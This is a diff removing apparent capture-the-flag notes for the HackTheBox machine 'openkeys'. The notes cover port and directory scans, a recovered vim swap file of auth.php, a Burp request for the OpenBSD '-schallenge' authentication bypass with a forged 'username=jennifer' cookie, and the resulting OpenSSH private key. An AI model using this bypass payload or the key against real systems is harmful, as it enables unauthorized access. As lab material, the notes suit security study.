@@ -1,169 +1,0 @@
-root@Blue3:~# nmap -sC -sV -oA NmapFull -A -p22,80 openkeys.htb
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 16:39 +07
-Nmap scan report for openkeys.htb (10.10.10.199)
-Host is up (0.076s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
-| ssh-hostkey:
-|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
-|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
-|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
-80/tcp open  http    OpenBSD httpd
-|_http-title: Site doesn't have a title (text/html).
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|firewall
-Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%), FreeBSD 10.X|7.X (91%), Cisco AsyncOS 7.X (87%)
-OS CPE: cpe:/o:openbsd:openbsd:4.4 cpe:/o:openbsd:openbsd:6 cpe:/o:openbsd:openbsd:5 cpe:/o:openbsd:openbsd:3 cpe:/o:freebsd:freebsd:10.0 cpe:/o:freebsd:freebsd:7.0 cpe:/h:cisco:ironport_c650 cpe:/o:cisco:asyncos:7.0.1
-Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), OpenBSD 4.1 (93%), OpenBSD 5.0 (93%), OpenBSD 4.2 (93%), OpenBSD 4.0 (93%), OpenBSD 3.8 - 4.7 (92%), OpenBSD 4.6 (92%), OpenBSD 4.7 (92%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT       ADDRESS
-1   126.62 ms 10.10.16.1
-2   40.04 ms  openkeys.htb (10.10.10.199)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 20.54 seconds
-
-#
-  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
-  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
-  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
-#
-
-root@Blue3:~# webdirscan --url=http://openkeys.htb
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://openkeys.htb
-[+] Threads:        30
-[+] Wordlist:       /media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/WEB/big
-[+] Status codes:   200,204,301,302,307
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     cgi,html,php,txt,config,cfg
-[+] Timeout:        10s
-===============================================================
-2020/09/15 17:03:46 Starting gobuster
-===============================================================
-/css (Status: 301)
-/fonts (Status: 301)
-/images (Status: 301)
-/includes (Status: 301)
-/index.html (Status: 200)
-/index.php (Status: 200)
-/js (Status: 301)
-/vendor (Status: 301)
-/sshkey.php (Status: 302)
-===============================================================
-2020/09/15 17:10:40 Finished
-===============================================================
-
-#
-  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
-  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
-  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
-#
-
-http://openkeys.htb/includes/auth.php.swp :
-b0VIM 8.1�-�^���jenniferopenkeys.htb/var/www/htdocs/includes/auth.php 3210#"! Utp=ad� � =����sWB@?" �������mgC� � � { a W J @ �������vpnmUS0���J� � � � � � � � � � � ?>}
-session_start();
- session_destroy();
- session_unset();
-{function close_session()} $_SESSION["username"] = $_REQUEST['username'];
- $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
- $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
- $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
- $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
- $_SESSION["logged_in"] = True;
-{function init_session()} } return False;
- { else } } return True;
- $_SESSION['last_activity'] = $time;
- // Session is active, update last activity time and return True { else } return False;
- close_session();
- { ($time - $_SESSION['last_activity']) > $session_timeout) if (isset($_SESSION['last_activity']) && $time = $_SERVER['REQUEST_TIME'];
- // Has the session expired? { if(isset($_SESSION["logged_in"])) // Is the user logged in? session_start();
- // Start the session $session_timeout = 300;
- // Session timeout in seconds{function is_active_session()} return $retcode;
- system($cmd, $retcode);
- $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
-{function authenticate($username, $password)
-;
-
-=> jennifer?
-
-#
-  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
-  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
-  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
-#
-
-Burp Suite:
-OpenBSD Authentication Exploit:
-POST /index.php HTTP/1.1
-Host: openkeys.htb
-Content-Length: 59
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://openkeys.htb
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://openkeys.htb/index.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: PHPSESSID=udv7blltjcpd111sb7p9kfnej0
-Connection: close
-
-username=-schallenge%3Apasswd&password=-schallenge%3Apasswd
-
-=>
-
-Cookie: PHPSESSID=udv7blltjcpd111sb7p9kfnej0;username=jennifer
-Connection: close
-
-username=-schallenge%3Apasswd&password=-schallenge%3Apasswd
-
-=>
-
-OpenSSH key for user jennifer
------BEGIN OPENSSH PRIVATE KEY-----
-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
------END OPENSSH PRIVATE KEY-----
